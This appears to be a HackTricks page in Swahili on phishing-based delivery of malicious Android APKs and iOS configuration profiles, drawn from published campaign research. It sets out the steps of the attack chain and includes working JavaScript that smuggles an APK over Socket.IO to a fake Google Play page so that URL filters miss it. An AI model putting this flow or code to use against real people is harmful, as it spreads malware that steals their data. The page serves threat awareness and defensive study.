# Phishing ya Simu na Usambazaji wa App Hasidi (Android na iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ukurasa huu unaeleza techniques zinazotumiwa na threat actors kusambaza **APK hasidi za Android** na **mobile-configuration profiles za iOS** kupitia phishing (SEO, social engineering, fake stores, dating apps, n.k.).
> Maudhui haya yamechukuliwa kutoka kwenye kampeni ya SarangTrap iliyoanikwa na Zimperium zLabs (2025) pamoja na tafiti nyingine za umma.<sup>[[1]](#references)</sup>

## Mtiririko wa Attack

1. **SEO/Phishing Infrastructure**
* Sajili domains nyingi zinazofanana na halisi (dating, cloud share, car service…).
– Tumia keywords za lugha za eneo husika na emojis katika element ya `<title>` ili kupata nafasi nzuri kwenye Google.
– Host maelekezo ya kusakinisha Android (`.apk`) na iOS kwenye landing page moja.
2. **First Stage Download**
* Android: direct link ya APK *unsigned* au ya “third-party store”.
* iOS: `itms-services://` au link ya kawaida ya HTTPS inayoelekeza kwenye profile hasidi ya **mobileconfig** (tazama hapa chini).
3. **Android Post-install Behaviour**
* Utekelezaji unaodhibitiwa na C2, matumizi mabaya ya permissions, dropper bypasses, ukusanyaji wa data wa chinichini, na tabia nyingine za malware baada ya usakinishaji zimeelezwa kwenye ukurasa maalumu wa Android Malware Post-Exploitation hapa chini.
4. **iOS Delivery Technique**
* **mobile-configuration profile** moja inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` na kadhalika ili kusajili kifaa katika usimamizi unaofanana na “MDM”.
* Maelekezo ya social-engineering:
1. Fungua Settings ➜ *Profile downloaded*.
2. Gusa *Install* mara tatu (screenshots zikiwa kwenye phishing page).
3. Iamini profile ya unsigned ➜ attacker anapata entitlement za *Contacts* na *Photo* bila ukaguzi wa App Store.
5. **iOS Web Clip Payload (phishing app icon)**
* Payload za `com.apple.webClip.managed` zinaweza **kubandika URL ya phishing kwenye Home Screen** zikiwa na icon/label yenye branding.
* Web Clips zinaweza kuendeshwa katika **full‑screen** (huficha UI ya browser) na kuwekwa kuwa **non‑removable**, hivyo kumlazimisha victim kufuta profile ili kuondoa icon.<sup>[[3]](#references)</sup>
6. **Network Layer**
* HTTP ya kawaida, mara nyingi kwenye port 80 ikiwa na HOST header kama `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → ni rahisi kugundua).

## Android Malware Post-Exploitation

Kwa tradecraft ya Android malware baada ya usakinishaji, kama vile C2, matumizi mabaya ya Accessibility, overlays, ATS automation, staged DEX loading, premium SMS, na persistence, tazama ukurasa maalumu wa Android Malware Post-Exploitation hapa chini:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers wanazidi kubadilisha static APK links kwa channel ya Socket.IO/WebSocket iliyopachikwa kwenye lures zinazoonekana kama Google Play. Hii huficha payload URL, hupita URL/extension filters, na hudumisha install UX halisi.<sup>[[2]](#references)[[4]](#references)</sup>

Mtiririko wa kawaida wa client ulioonekana katika mazingira halisi:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Kwa nini hukwepa vidhibiti rahisi:
- Hakuna static APK URL inayofichuliwa; payload huundwa upya kwenye memory kutoka kwa WebSocket frames.
- Vichujio vya URL/MIME/extension vinavyozuia majibu ya moja kwa moja ya .apk vinaweza kukosa binary data inayopitishwa kupitia WebSockets/Socket.IO.
- Crawlers na URL sandboxes ambazo hazitekelezi WebSockets hazitapakua payload.

Tazama pia WebSocket tradecraft na tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Upande wa Giza wa Mapenzi: Kampeni ya Uporaji ya SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Mipangilio ya Web Clips payload kwa vifaa vya Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan Inayolenga Watumiaji wa Android wa Indonesia na Vietnam](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
